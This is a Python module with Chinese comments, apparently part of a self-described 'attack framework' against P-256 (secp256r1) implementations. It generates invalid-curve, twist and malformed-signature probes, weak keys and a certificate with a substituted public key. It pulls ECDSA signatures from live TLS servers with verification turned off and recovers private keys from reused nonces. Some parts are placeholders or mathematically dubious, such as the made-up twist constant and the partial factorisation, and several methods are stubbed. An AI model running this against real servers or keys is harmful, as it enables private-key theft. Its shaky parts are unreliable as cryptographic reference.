#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
P-256
Enhanced Edition: 完整实现14种数学方法
基于Java Card手写P-256实现，构建全方位椭圆曲线攻击框架
"""

from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
import math
import os
import random
import socket
import ssl
import struct
import time
import base64
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from enum import Enum
import statistics
import numpy as np  # 添加numpy导入
import subprocess

# 密码学库
try:
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    from cryptography.x509.oid import NameOID, ExtensionOID
except ImportError:
    print("[!] Installing required cryptography libraries...")
    subprocess.check_call(["pip", "install", "cryptography", "pyjwt", "ecdsa", "numpy"])
    from cryptography import x509
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    from cryptography.x509.oid import NameOID, ExtensionOID


# 1. 常量定义 (Constants)


class P256Constants:
    """P-256 (secp256r1) 曲线参数"""
    # 素数 p = 2^256 - 2^224 + 2^192 + 2^96 - 1
    P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
    # 曲线方程: y² = x³ + ax + b
    A = -3
    B = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
    # 基点G
    GX = 0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296
    GY = 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5
    # 阶数 n (基点的阶)
    N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
    # 余因子 h = 1
    H = 1
    
    # 扭曲曲线参数 (quadratic twist)
    # E': y² = x³ - 3x + b' where b' = b * c² for non-residue c
    TWIST_B = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604C  # b+1 作为示例
    
    # 小素数列表（用于小子群攻击）
    SMALL_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47]


class AttackType(Enum):
    """攻击类型枚举"""
    # 原有攻击类型
    INVALID_CURVE = "invalid_curve"          # 非法曲线点
    NONCE_HEALTH = "nonce_health"            # Nonce健康度
    KEYSHARE_DIFF = "keyshare_diff"          # KeyShare差分
    PARAM_FUZZ = "param_fuzz"                # 参数模糊测试
    TIMING_ORACLE = "timing_oracle"          # 时序预言机
    BASELINE_AUDIT = "baseline_audit"        # 基线审计
    
    # 新增硬核攻击类型
    TWIST_ATTACK = "twist_attack"            # 扭曲曲线攻击
    SMALL_SUBGROUP = "small_subgroup"        # 小子群限制
    COMPRESSION_FAULT = "compression_fault"   # 压缩点故障注入
    LATTICE_NONCE = "lattice_nonce"          # 格基规约攻击
    # 新增核心缺失攻击类型

    NONCE_REUSE = "nonce_reuse"              # ECDSA nonce重用攻击


# 在 AttackType 枚举后添加缺失的数据类定义
@dataclass
class P256AuditReport:
    """P-256审计报告"""
    target: str
    timestamp: str
    total_tests: int
    vulnerabilities_found: int
    critical_count: int
    high_count: int
    medium_count: int
    attack_results: List[AttackResult]
    total_runtime_ms: float
    overall_security_score: float
    recommendations: List[str] = field(default_factory=list)


# 2. 数据结构 (Data Structures)
@dataclass
class ECPoint:
    """椭圆曲线点"""
    x: Optional[int] = None
    y: Optional[int] = None
    is_infinity: bool = False
    curve_type: str = "normal"  # normal, twist, invalid
    order: Optional[int] = None  # 点的阶数
    
    def to_bytes(self, compressed: bool = False) -> bytes:
        """序列化为字节"""
        if self.is_infinity:
            return b'\x00'
        
        x_bytes = self.x.to_bytes(32, 'big') if self.x else bytes(32)
        
        if compressed:
            # 压缩格式: 0x02 (偶) or 0x03 (奇) + x
            prefix = 0x02 if (self.y % 2 == 0) else 0x03
            return bytes([prefix]) + x_bytes
        else:
            # 未压缩格式: 0x04 + x + y
            y_bytes = self.y.to_bytes(32, 'big') if self.y else bytes(32)
            return b'\x04' + x_bytes + y_bytes


@dataclass
class AttackResult:
    """攻击结果"""
    attack_type: AttackType
    success: bool
    vulnerability: Optional[str] = None
    evidence: Dict[str, Any] = field(default_factory=dict)
    timing_ms: float = 0.0
    confidence: float = 0.0  # 0-1 置信度
    severity: str = "INFO"  # INFO, LOW, MEDIUM, HIGH, CRITICAL
    recommendation: str = ""
    raw_data: List[Any] = field(default_factory=list)


@dataclass
class NonceSignature:
    """ECDSA签名（用于nonce分析）"""
    r: int
    s: int
    message_hash: bytes
    timestamp: float
    nonce_bits_leaked: Optional[int] = None  # 泄露的nonce比特数
    nonce_value: Optional[int] = None  # 如果已知



# 3. 核心组件：探针工厂 (Probe Factory)
class ECProbeFactory:
    """
    探针工厂 - 专门制造各种"坏"的椭圆曲线点、参数和证书
    """
    
    def __init__(self):
        self.p = P256Constants.P
        self.n = P256Constants.N
        self.backend = default_backend()
        # 先注释掉，等P256EllipticCurve定义后再启用
        # self.curve = P256EllipticCurve()  # 使用完整的P256实现
        self._init_small_order_points()
    
    def _init_small_order_points(self):
        """初始化小阶点缓存 - 完整数学实现"""
        self.small_order_points = {}
        print("  [*] Initializing small order points cache...")
        
        # 预计算P-256曲线上的特殊小阶点
        # 注意：P-256是素数阶曲线，所以真正的小阶点很少
        
        # 1. 无穷远点（阶数为1）
        self.small_order_points[1] = ECPoint(None, None, True, "small_subgroup", 1)
        
        # 2. 寻找阶数为2的点（满足2P = O，即P + P = O，所以y = 0）
        order_2_point = self._find_order_2_point()
        if order_2_point:
            self.small_order_points[2] = order_2_point
            print(f"    [+] Found order-2 point: ({hex(order_2_point.x)[:16]}..., {order_2_point.y})")
        
        # 3. P-256 为素数阶曲线，真实小阶点除无穷远点与极少的 y=0 解以外基本不存在；不注入任何伪造“类小阶”点
        print(f"    [+] Cached {len(self.small_order_points)} real small-order points")
    
    def _find_order_2_point(self) -> Optional[ECPoint]:
        """寻找阶数为2的点 (2P = O，即y = 0)"""
        # 对于阶数为2的点，必须满足 y = 0
        # 即方程变成：0 = x³ + ax + b (mod p)
        # 解这个三次方程：x³ - 3x + b = 0 (mod p)
        
        # 暴力搜索所有可能的x值
        for x in range(1000):  # 搜索小整数
            y2 = (pow(x, 3, self.p) + P256Constants.A * x + P256Constants.B) % self.p
            if y2 == 0:
                return ECPoint(x, 0, False, "small_subgroup", 2)
        
        # 搜索接近p的值
        for offset in range(1, 1000):
            x = self.p - offset
            y2 = (pow(x, 3, self.p) + P256Constants.A * x + P256Constants.B) % self.p
            if y2 == 0:
                return ECPoint(x, 0, False, "small_subgroup", 2)
        
        # 对于P-256，可能没有阶数为2的点，这是正常的
        return None
    

    
    #  原有方法 
    
    @staticmethod
    def generate_invalid_curve_point() -> List[ECPoint]:
        """生成非法曲线点集合"""
        points = []
        
        # 1. 不在曲线上的点（y² ≠ x³ + ax + b）
        invalid_x = P256Constants.GX
        invalid_y = P256Constants.GY + 1  # 故意偏移
        points.append(ECPoint(invalid_x, invalid_y, False, "invalid"))
        
        # 2. 坐标越界的点
        overflow_x = P256Constants.P + 1
        overflow_y = P256Constants.P + 1
        points.append(ECPoint(overflow_x, overflow_y, False, "invalid"))
        
        # 3. 无穷远点的各种编码
        points.append(ECPoint(None, None, True, "invalid"))
        points.append(ECPoint(0, 0, False, "invalid"))  # 假装的无穷远点
        
        # 4. x坐标是非二次剩余（没有对应的y）
        non_residue_x = 0x2  # 需要找一个真正的非二次剩余
        points.append(ECPoint(non_residue_x, 0, False, "invalid"))
        
        return points
    
    @staticmethod
    def generate_edge_case_scalars() -> List[int]:
        """生成边界标量值"""
        return [
            0,  # 零
            1,  # 一
            P256Constants.N - 1,  # n-1
            P256Constants.N,  # n (会变成0)
            P256Constants.N + 1,  # n+1 (会变成1)
            P256Constants.P,  # 素数p
            2**255 - 1,  # 接近最大值
            2**256 - 1,  # 溢出值
            -1 % P256Constants.N,  # -1 mod n
        ]
    
    @staticmethod
    def generate_malformed_signatures() -> List[NonceSignature]:
        """生成畸形ECDSA签名"""
        sigs = []
        
        # r=0 或 s=0
        sigs.append(NonceSignature(0, 12345, b"test", time.time()))
        sigs.append(NonceSignature(12345, 0, b"test", time.time()))
        
        # r或s超出范围
        sigs.append(NonceSignature(P256Constants.N, 12345, b"test", time.time()))
        sigs.append(NonceSignature(12345, P256Constants.N, b"test", time.time()))
        
        # r和s相等（可能的nonce泄露）
        same_val = random.randint(1, P256Constants.N - 1)
        sigs.append(NonceSignature(same_val, same_val, b"test", time.time()))
        
        return sigs
    
    @staticmethod
    def generate_weak_private_keys() -> List[int]:
        """生成弱私钥"""
        keys = []
        
        # 小私钥
        for i in range(1, 100):
            keys.append(i)
        
        # 接近边界的私钥
        keys.append(P256Constants.N // 2)
        keys.append(P256Constants.N - 1000)
        
        # 特殊模式
        keys.append(0x0101010101010101010101010101010101010101010101010101010101010101)
        keys.append(0x5555555555555555555555555555555555555555555555555555555555555555)
        keys.append(0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)
        
        return keys
    
    @staticmethod
    def craft_malicious_certificate(point: ECPoint) -> bytes:
        """构造包含恶意EC公钥的证书"""
        try:
            import datetime
            from cryptography import x509
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import ec
            
            # 生成自签名私钥
            private_key = ec.generate_private_key(ec.SECP256R1())
            
            # 构造包含恶意点的证书
            subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, "malicious.test"),
            ])
            
            # 构造证书
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.datetime.utcnow()
            ).not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=10)
            ).sign(private_key, hashes.SHA256())
            
            # 获取证书DER编码
            cert_der = cert.public_bytes(serialization.Encoding.DER)
            
            # 替换公钥部分为恶意点（简化处理，实际需要完整ASN.1操作）
            if point.x and point.y:
                # 在DER中查找并替换EC公钥
                point_bytes = b'\x04' + point.x.to_bytes(32, 'big') + point.y.to_bytes(32, 'big')
                # 简单替换策略：查找标准P-256公钥模式并替换
                if b'\x04' in cert_der:
                    # 找到第一个未压缩点标记并替换后续65字节
                    idx = cert_der.find(b'\x04')
                    if idx > 0 and len(cert_der) > idx + 65:
                        cert_der = cert_der[:idx] + point_bytes + cert_der[idx+65:]
            
            return cert_der
            
        except Exception:
            # 如果构造失败，返回基础证书模板
            return b'\x30\x82\x01\x23\x30\x82\x00\xc9\x02\x01\x00\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x0b\x05\x00'
    
    #  新增硬核方法 

    
    def _find_y_for_x(self, x):
        """根据x坐标找对应的y坐标"""
        y2 = (pow(x, 3, self.p) + P256Constants.A * x + P256Constants.B) % self.p
        return self._tonelli_shanks(y2, self.p)
    
    def _find_non_quadratic_residue(self) -> Optional[int]:
        """寻找一个小的非二次剩余 d，使得 Legendre(d) = -1"""
        try:
            for candidate in range(2, 1000):
                if pow(candidate, (self.p - 1) // 2, self.p) == self.p - 1:
                    return candidate
        except Exception:
            pass
        return None
    
    def generate_twist_curve_point(self) -> List[ECPoint]:
        """生成P-256扭曲曲线上的点 严格按数学定义"""
        points: List[ECPoint] = []
        
        # 选择一个非二次剩余 d（Legendre 符号为 -1）
        d = self._find_non_quadratic_residue()
        if d is None:
            return points
        
        # 扭曲曲线 E^d: y^2 = x^3 + a*d^2*x + b*d^3 (mod p)
        a_twist = (P256Constants.A * pow(d, 2, self.p)) % self.p
        b_twist = (P256Constants.B * pow(d, 3, self.p)) % self.p
        
        # 方法1：使用基点x尝试在扭曲曲线上求y
        x0 = P256Constants.GX
        y2_twist = (pow(x0, 3, self.p) + a_twist * x0 + b_twist) % self.p
        y_twist = self._tonelli_shanks(y2_twist, self.p)
        if y_twist is not None:
            points.append(ECPoint(x0, y_twist, False, "twist"))
        
        # 方法2：随机抽样若干x，构造扭曲曲线上的有效点
        trials = 10
        for _ in range(trials):
            x = random.randrange(1, self.p)
            y2 = (pow(x, 3, self.p) + a_twist * x + b_twist) % self.p
            y = self._tonelli_shanks(y2, self.p)
            if y is not None:
                points.append(ECPoint(x, y, False, "twist"))
                if len(points) >= 5:
                    break
        
        return points
    
    def generate_small_order_point(self, order: int) -> ECPoint:
        """生成特定阶数的点 - 仅返回真实可验证的点 """
        if order in self.small_order_points:
            return self.small_order_points[order]
        
        print(f"  [*] Generating point of order {order}...")
        
        # 使用高级算法查找真实的小阶点（优先在扭曲曲线上搜索）
        real_point = self._find_small_order_point_advanced(order)
        
        if real_point:
            # 缓存结果
            self.small_order_points[order] = real_point
            print(f"    [+] Successfully generated order-{order} point")
            return real_point
        
        # 未找到真实小阶点则返回无穷远点占位，调用方应据此跳过测试
        print(f"    [!] No real order-{order} point found on P-256; returning point at infinity")
        return ECPoint(None, None, True, "small_subgroup", order)
    
    def generate_valid_point(self) -> ECPoint:
        """生成有效的椭圆曲线点"""
        return ECPoint(P256Constants.GX, P256Constants.GY)
    
    def generate_all_test_points(self) -> dict:
        """生成所有测试点"""
        return {
            "invalid_curve": self.generate_invalid_curve_point(),
            "twist_curve": self.generate_twist_curve_point(),
            "small_order": self.generate_small_order_points(),
        }
    
    def generate_small_order_points(self, max_order: int = 100) -> List[ECPoint]:
        """生成小阶数的点 仅返回真实可验证的点 """
        points: List[ECPoint] = []
        for order, pt in self.small_order_points.items():
            if order <= max_order and pt is not None:
                points.append(pt)
        return points
    
    def _find_small_order_point_advanced(self, target_order: int) -> Optional[ECPoint]:
        """高级数学方法查找指定阶数的点（P-256 实际约束）。
        仅在 target_order == 2 时搜索满足 y=0 的点；否则返回 None。
        """
        try:
            if target_order == 2:
                return self._find_order_2_point()
        except Exception:
            pass
        return None
    
    def _optimized_small_order_search(self, target_order: int) -> Optional[ECPoint]:
        """优化的小阶点搜索算法（对 P-256 主曲线禁用伪造搜索）。"""
        if target_order == 2:
            return self._find_order_2_point()
        return None
    
    def _compute_point_order(self, point: ECPoint, max_check: int = 1000) -> Optional[int]:
        """计算椭圆曲线点的阶数"""
        if point.is_infinity:
            return 1
        
        # 使用Baby-step Giant-step算法的变种
        current_point = ECPoint(point.x, point.y)
        
        for order in range(1, min(max_check + 1, 1000)):  # 限制搜索范围避免计算爆炸
            if current_point.is_infinity:
                return order
            
            # 计算 [order]P = current_point + P
            current_point = self._point_add(current_point, point)
            
            # 检查是否回到了无穷远点
            if current_point.is_infinity:
                return order + 1
        
        return None  # 阶数太大，无法计算
    
    def generate_compression_fault_points(self) -> List[Tuple[ECPoint, bytes]]:
        """[Removed] Compression fault vectors removed; keep only real network compression tests."""
        return []
    
    def generate_lattice_signatures(self, host: str, port: int, num_sigs: int = 100) -> List[NonceSignature]:
        """收集真实ECDSA签名用于格攻击（不做任何本地模拟）。
        优先来源：TLS 证书签名；若可用可扩展到应用层签名端点。
        返回 NonceSignature 列表（r、s 为 int，message_hash 为 bytes）。
        """
        signatures: List[NonceSignature] = []
        
        # 1) 从 TLS 证书提取一条真实 ECDSA 签名
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=5.0) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    der = ssock.getpeercert(True)
                    if der:
                        cert = x509.load_der_x509_certificate(der)
                        sig_bytes = cert.signature
                        # 解析 DER ECDSA 签名
                        r, s = self._parse_der_ecdsa_sig(sig_bytes)
                        if r and s:
                            msg_hash = hashlib.sha256(cert.tbs_certificate_bytes).digest()
                            signatures.append(NonceSignature(r=r, s=s, message_hash=msg_hash, timestamp=time.time()))
        except Exception:
            pass
        
        # TODO: 可按需扩展：应用层 /api/ecdsa/sign 或 JWT 提取，这里不做任何本地伪造
        return signatures[:num_sigs]
    
    def _parse_der_ecdsa_sig(self, sig: bytes) -> Tuple[Optional[int], Optional[int]]:
        """最小DER解析，提取(r,s)。"""
        try:
            if not sig or sig[0] != 0x30:
                return None, None
            idx = 2  # 跳过SEQUENCE tag与length（仅处理短长度场景）
            if sig[idx] != 0x02:
                return None, None
            r_len = sig[idx+1]
            r = int.from_bytes(sig[idx+2:idx+2+r_len], 'big')
            idx = idx + 2 + r_len
            if sig[idx] != 0x02:
                return None, None
            s_len = sig[idx+1]
            s = int.from_bytes(sig[idx+2:idx+2+s_len], 'big')
            return r, s
        except Exception:
            return None, None
    
    def generate_montgomery_ladder_inputs(self) -> List[Tuple[int, ECPoint]]:
        """[Removed] Montgomery ladder inputs are hardware side-channel oriented."""
        return []
    

    
    def generate_endomorphism_test_vectors(self) -> List[Tuple[int, ECPoint, str]]:
        """[Removed] GLV/endomorphism vectors are not applicable for network attacks."""
        return []
    
    #  辅助方法 
    
    def _tonelli_shanks(self, n: int, p: int) -> Optional[int]:
        """Tonelli-Shanks算法求模平方根"""
        # 检查n是否是二次剩余
        if pow(n, (p - 1) // 2, p) != 1:
            return None
        
        # 找到Q和S使得 p-1 = Q * 2^S
        Q = p - 1
        S = 0
        while Q % 2 == 0:
            Q //= 2
            S += 1
        
        # 找一个非二次剩余z
        z = 2
        while pow(z, (p - 1) // 2, p) != p - 1:
            z += 1
        
        # 初始化
        M = S
        c = pow(z, Q, p)
        t = pow(n, Q, p)
        R = pow(n, (Q + 1) // 2, p)
        
        while True:
            if t == 0:
                return 0
            if t == 1:
                return R
            
            # 找最小的i使得t^(2^i) = 1
            i = 1
            t_power = (t * t) % p
            while t_power != 1 and i < M:
                t_power = (t_power * t_power) % p
                i += 1
            
            # 更新
            b = pow(c, 1 << (M - i - 1), p)
            M = i
            c = (b * b) % p
            t = (t * c) % p
            R = (R * b) % p
    
    def _find_y_for_x(self, x: int) -> Optional[int]:
        """给定x坐标，计算对应的y坐标"""
        y2 = (pow(x, 3, self.p) + P256Constants.A * x + P256Constants.B) % self.p
        return self._tonelli_shanks(y2, self.p)
    
    def _scalar_mult(self, point: ECPoint, scalar: int) -> ECPoint:
        """完整的标量乘法实现 - 使用Double-and-Add算法"""
        if scalar == 0:
            return ECPoint(None, None, True)
        
        if point.is_infinity:
            return ECPoint(None, None, True)
        
        # 处理负标量
        if scalar < 0:
            scalar = -scalar % P256Constants.N
            # 对点取反: (x, -y mod p)
            neg_y = (-point.y) % self.p
            point = ECPoint(point.x, neg_y)
        
        # 确保标量在有效范围内
        scalar = scalar % P256Constants.N
        
        # Double-and-Add 算法
        result = ECPoint(None, None, True)  # 无穷远点
        addend = ECPoint(point.x, point.y)  # 当前点的副本
        
        while scalar > 0:
            if scalar & 1:  # 如果当前位是1
                result = self._point_add(result, addend)
            addend = self._point_double(addend)
            scalar >>= 1
        
        return result
    
    def _point_add(self, p1: ECPoint, p2: ECPoint) -> ECPoint:
        """椭圆曲线点加法"""
        # 处理无穷远点
        if p1.is_infinity:
            return ECPoint(p2.x, p2.y, p2.is_infinity)
        if p2.is_infinity:
            return ECPoint(p1.x, p1.y, p1.is_infinity)
        
        # 如果两点相同，使用点倍乘
        if p1.x == p2.x and p1.y == p2.y:
            return self._point_double(p1)
        
        # 如果x坐标相同但y坐标相反，结果是无穷远点
        if p1.x == p2.x:
            return ECPoint(None, None, True)
        
        # 标准点加法公式
        # lambda = (y2 - y1) / (x2 - x1) mod p
        dx = (p2.x - p1.x) % self.p
        dy = (p2.y - p1.y) % self.p
        dx_inv = self._mod_inverse(dx, self.p)
        lambda_val = (dy * dx_inv) % self.p
        
        # x3 = lambda^2 - x1 - x2 mod p
        x3 = (lambda_val * lambda_val - p1.x - p2.x) % self.p
        
        # y3 = lambda * (x1 - x3) - y1 mod p
        y3 = (lambda_val * (p1.x - x3) - p1.y) % self.p
        
        return ECPoint(x3, y3)
    
    def _point_double(self, point: ECPoint) -> ECPoint:
        """椭圆曲线点倍乘"""
        if point.is_infinity:
            return ECPoint(None, None, True)
        
        if point.y == 0:
            return ECPoint(None, None, True)
        
        # 点倍乘公式
        # lambda = (3*x^2 + a) / (2*y) mod p
        # 对于P-256，a = -3
        numerator = (3 * point.x * point.x + P256Constants.A) % self.p
        denominator = (2 * point.y) % self.p
        denominator_inv = self._mod_inverse(denominator, self.p)
        lambda_val = (numerator * denominator_inv) % self.p
        
        # x3 = lambda^2 - 2*x mod p
        x3 = (lambda_val * lambda_val - 2 * point.x) % self.p
        
        # y3 = lambda * (x - x3) - y mod p
        y3 = (lambda_val * (point.x - x3) - point.y) % self.p
        
        return ECPoint(x3, y3)
    
    def _mod_inverse(self, a: int, m: int) -> int:
        """计算模逆 - 使用扩展欧几里得算法"""
        if a < 0:
            a = (a % m + m) % m
        
        # 扩展欧几里得算法
        def extended_gcd(a, b):
            if a == 0:
                return b, 0, 1
            gcd, x1, y1 = extended_gcd(b % a, a)
            x = y1 - (b // a) * x1
            y = x1
            return gcd, x, y
        
        gcd, x, _ = extended_gcd(a % m, m)
        if gcd != 1:
            raise ValueError("Modular inverse does not exist")
        return (x % m + m) % m
    
    def _find_cube_root_of_unity_mod_p(self) -> int:
        """[Removed] Not used after endomorphism module cleanup."""
        raise NotImplementedError("Endomorphism-related functionality removed")
    
    def _find_cube_root_of_unity_mod_n(self) -> int:
        """[Removed] Not used after endomorphism module cleanup."""
        raise NotImplementedError("Endomorphism-related functionality removed")
    
    def _find_primitive_root_mod_p(self) -> Optional[int]:
        """寻找模p的原根"""
        try:
            # 对于P-256的素数p，寻找原根
            # 原根g满足：g^((p-1)/q) ≢ 1 (mod p) 对所有素因子q
            
            # P-256的p-1的素因子分解（部分已知）
            p_minus_1 = self.p - 1
            known_factors = [2, 3]  # 简化，实际需要完整分解
            
            for candidate in range(2, 100):  # 限制搜索范围
                is_primitive = True
                
                for factor in known_factors:
                    if pow(candidate, p_minus_1 // factor, self.p) == 1:
                        is_primitive = False
                        break
                
                if is_primitive:
                    return candidate
            
        except Exception:
            pass
        
        return None
    
    def _find_primitive_root_mod_n(self) -> Optional[int]:
        """寻找模n的原根"""
        try:
            # 对于P-256的阶n，寻找原根
            n = P256Constants.N
            n_minus_1 = n - 1
            
            # 简化的素因子（实际需要完整分解）
            known_factors = [2, 3]
            
            for candidate in range(2, 100):  # 限制搜索范围
                is_primitive = True
                
                for factor in known_factors:
                    if pow(candidate, n_minus_1 // factor, n) == 1:
                        is_primitive = False
                        break
                
                if is_primitive:
                    return candidate
                    
        except Exception:
            pass
        
        return None
    
    def _is_point_on_curve(self, point: ECPoint) -> bool:
        """验证点是否在P-256曲线上"""
        if point.is_infinity:
            return True
            
        if point.x is None or point.y is None:
            return False
        
        # 验证 y² = x³ + ax + b (mod p)
        # 对于P-256: a = -3, b = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
        left = (point.y * point.y) % self.p
        right = (pow(point.x, 3, self.p) + P256Constants.A * point.x + P256Constants.B) % self.p
        
        return left == right
    
    def _decompose_scalar_glv(self, k: int) -> tuple[int, int]:
        """[Removed] GLV decomposition not applicable in remote attack model."""
        raise NotImplementedError("Endomorphism-related functionality removed")
    

    
    def _points_equal(self, p1: ECPoint, p2: ECPoint) -> bool:
        """检查两点是否相等"""
        if p1.is_infinity and p2.is_infinity:
            return True
        if p1.is_infinity or p2.is_infinity:
            return False
        return p1.x == p2.x and p1.y == p2.y
    
    def _point_to_key(self, point: ECPoint) -> str:
        """将点转换为字典键"""
        if point.is_infinity:
            return "INF"
        return f"{point.x}_{point.y}"
    
    def detect_nonce_reuse(self, signatures: List[NonceSignature]) -> List[tuple]:
        """检测ECDSA签名中的nonce重用"""
        reused_nonces = []
        
        # 按r值分组
        r_groups = {}
        for i, sig in enumerate(signatures):
            if sig.r not in r_groups:
                r_groups[sig.r] = []
            r_groups[sig.r].append((i, sig))
        
        # 检查重用
        for r_val, sigs in r_groups.items():
            if len(sigs) >= 2:
                # 发现nonce重用，计算私钥
                sig1_idx, sig1 = sigs[0]
                sig2_idx, sig2 = sigs[1]
                
                private_key = self._recover_private_key_from_reused_nonce(sig1, sig2)
                if private_key:
                    reused_nonces.append((sig1_idx, sig2_idx, private_key))
        
        return reused_nonces
    
    def _recover_private_key_from_reused_nonce(self, sig1: NonceSignature, sig2: NonceSignature) -> Optional[int]:
        """从重用的nonce恢复私钥"""
        if sig1.r != sig2.r:
            return None
            
        try:
            # 计算 k = (h1 - h2) / (s1 - s2) mod n
            h1 = int.from_bytes(sig1.message_hash, 'big')
            h2 = int.from_bytes(sig2.message_hash, 'big')
            
            s_diff = (sig1.s - sig2.s) % P256Constants.N
            h_diff = (h1 - h2) % P256Constants.N
            
            if s_diff == 0:
                return None
                
            s_diff_inv = self._mod_inverse(s_diff, P256Constants.N)
            k = (h_diff * s_diff_inv) % P256Constants.N
            
            # 计算私钥 d = (s*k - h) / r mod n
            s_k = (sig1.s * k) % P256Constants.N
            r_inv = self._mod_inverse(sig1.r, P256Constants.N)
            private_key = ((s_k - h1) * r_inv) % P256Constants.N
            
            return private_key
            
        except Exception:
            return None
    
    def analyze_nonce_bias(self, signatures: List[NonceSignature]) -> dict:
        """分析nonce偏差模式"""
        if len(signatures) < 10:
            return {'bias_detected': False, 'reason': 'insufficient_samples'}
        
        r_values = [sig.r for sig in signatures]
        
        # MSB偏差分析
        msb_analysis = self._analyze_msb_bias(r_values)
        
        # LSB熵分析
        lsb_analysis = self._analyze_lsb_entropy(r_values)
        
        # 时序相关性分析
        timing_analysis = self._analyze_timing_correlation(signatures)
        
        bias_score = 0
        indicators = []
        
        if msb_analysis['bias'] > 0.1:
            bias_score += 3
            indicators.append(f"MSB bias: {msb_analysis['bias']:.3f}")
            
        if lsb_analysis['entropy'] < 0.9:
            bias_score += 2
            indicators.append(f"LSB entropy: {lsb_analysis['entropy']:.3f}")
            
        if timing_analysis['correlation'] > 0.3:
            bias_score += 2
            indicators.append(f"Timing correlation: {timing_analysis['correlation']:.3f}")
        
        return {
            'bias_detected': bias_score >= 3,
            'bias_score': bias_score,
            'indicators': indicators,
            'lattice_attack_feasible': bias_score >= 4,
            'estimated_leaked_bits': self._estimate_leaked_bits(msb_analysis, lsb_analysis)
        }
    
    def _analyze_msb_bias(self, r_values: List[int]) -> dict:
        """分析最高位偏差"""
        msb_counts = {}
        for r in r_values:
            msb = r >> 252  # P-256的最高4位
            msb_counts[msb] = msb_counts.get(msb, 0) + 1
        
        expected_freq = len(r_values) / 16
        max_deviation = max(abs(count - expected_freq) for count in msb_counts.values())
        bias = max_deviation / expected_freq
        
        return {'bias': bias, 'distribution': msb_counts}
    
    def _analyze_lsb_entropy(self, r_values: List[int]) -> dict:
        """分析最低位熵"""
        lsb_bits = []
        for r in r_values:
            lsb_bits.extend([(r >> i) & 1 for i in range(8)])  # 最低8位
        
        if not lsb_bits:
            return {'entropy': 1.0}
            
        # 计算Shannon熵
        bit_counts = [lsb_bits.count(0), lsb_bits.count(1)]
        total = len(lsb_bits)
        
        entropy = 0
        for count in bit_counts:
            if count > 0:
                p = count / total
                entropy -= p * math.log2(p)
        
        return {'entropy': entropy, 'expected': 1.0}
    
    def _analyze_timing_correlation(self, signatures: List[NonceSignature]) -> dict:
        """分析时序相关性"""
        if len(signatures) < 2:
            return {'correlation': 0.0}
        
        # 提取时间间隔和r值变化
        time_diffs = []
        r_diffs = []
        
        for i in range(1, len(signatures)):
            time_diff = signatures[i].timestamp - signatures[i-1].timestamp
            r_diff = abs(signatures[i].r - signatures[i-1].r)
            
            time_diffs.append(time_diff)
            r_diffs.append(r_diff)
        
        if len(time_diffs) < 2:
            return {'correlation': 0.0}
        
        # 计算皮尔逊相关系数
        correlation = self._pearson_correlation(time_diffs, r_diffs)
        
        return {'correlation': abs(correlation)}
    
    def _pearson_correlation(self, x: List[float], y: List[float]) -> float:
        """计算皮尔逊相关系数"""
        if len(x) != len(y) or len(x) < 2:
            return 0.0
        
        n = len(x)
        sum_x = sum(x)
        sum_y = sum(y)
        sum_xy = sum(x[i] * y[i] for i in range(n))
        sum_x2 = sum(xi**2 for xi in x)
        sum_y2 = sum(yi**2 for yi in y)
        
        numerator = n * sum_xy - sum_x * sum_y
        denominator = ((n * sum_x2 - sum_x**2) * (n * sum_y2 - sum_y**2))**0.5
        
        if denominator == 0:
            return 0.0
        
        return numerator / denominator
    
    def _estimate_leaked_bits(self, msb_analysis: dict, lsb_analysis: dict) -> int:
        """估计泄露的nonce位数"""
        leaked_bits = 0
        
        if msb_analysis['bias'] > 0.2:
            leaked_bits += 4  # 高MSB偏差
        elif msb_analysis['bias'] > 0.1:
            leaked_bits += 2
            
        if lsb_analysis['entropy'] < 0.8:
            leaked_bits += 3  # 低LSB熵
        elif lsb_analysis['entropy'] < 0.9:
            leaked_bits += 1
        
        return min(leaked_bits, 8)  # 限制最大泄露位数
    
    def _chi_squared_test(self, r_values: List[int]) -> float:
        """卡方检验nonce分布均匀性"""
        if len(r_values) < 10:
            return 1.0
        
        # 将r值分为16个bins（最高4位）
        observed = [0] * 16
        for r in r_values:
            bin_idx = (r >> 252) & 0xF  # 取最高4位
            observed[bin_idx] += 1
        
        # 期望频率
        expected = len(r_values) / 16
        
        # 计算卡方统计量
        chi_squared = sum((obs - expected)**2 / expected for obs in observed if expected > 0)
        
        # 自由度 = bins - 1 = 15
        # 简化p值计算（精确计算需要gamma函数）
        import math
        critical_values = {15: 24.996}  # α=0.05的临界值
        
        if chi_squared > critical_values.get(15, 25):
            return chi_squared / 100  # 返回小p值
        return 0.5  # 返回中等p值
    
